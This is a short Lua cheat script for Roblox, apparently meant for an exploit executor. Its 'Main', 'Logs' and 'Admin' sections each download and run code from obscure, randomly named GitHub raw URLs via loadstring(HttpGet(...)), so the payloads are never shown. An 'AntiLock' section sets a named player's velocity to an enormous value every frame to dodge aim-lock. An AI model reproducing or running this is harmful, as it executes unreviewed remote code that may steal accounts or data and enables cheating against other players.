--Main
loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/aehtnpopoaoerjpofehnajpo225236/main/hreajettsrka4658846545969", true))()

--Logs
loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/wgrijndsapmoioiesrdmvipso324326523523/main/sfasfdrhadfgsad3253467457sdfgdfshfdhjj", true))()

--Admin
wait(5)
loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/sgzhdsxhsrt6745745joinijodnoizsd25/main/sdhdfjherajserk6346347cdzs", true))()

--AntiLock
getgenv().Sky = true 
getgenv().SkyAmount = 100000000000000000000000000

game:GetService("RunService").heartbeat:Connect(function()
    if getgenv().Sky ~= false then 
    local vel = game.Workspace.Players.KreepOZi.HumanoidRootPart.Velocity
    game.Workspace.Players.KreepOZi.HumanoidRootPart.Velocity = Vector3.new(0,      getgenv().SkyAmount,0) 
    game:GetService("RunService").RenderStepped:Wait()
    game.Workspace.Players.KreepOZi.HumanoidRootPart.Velocity = vel
    end 
end)
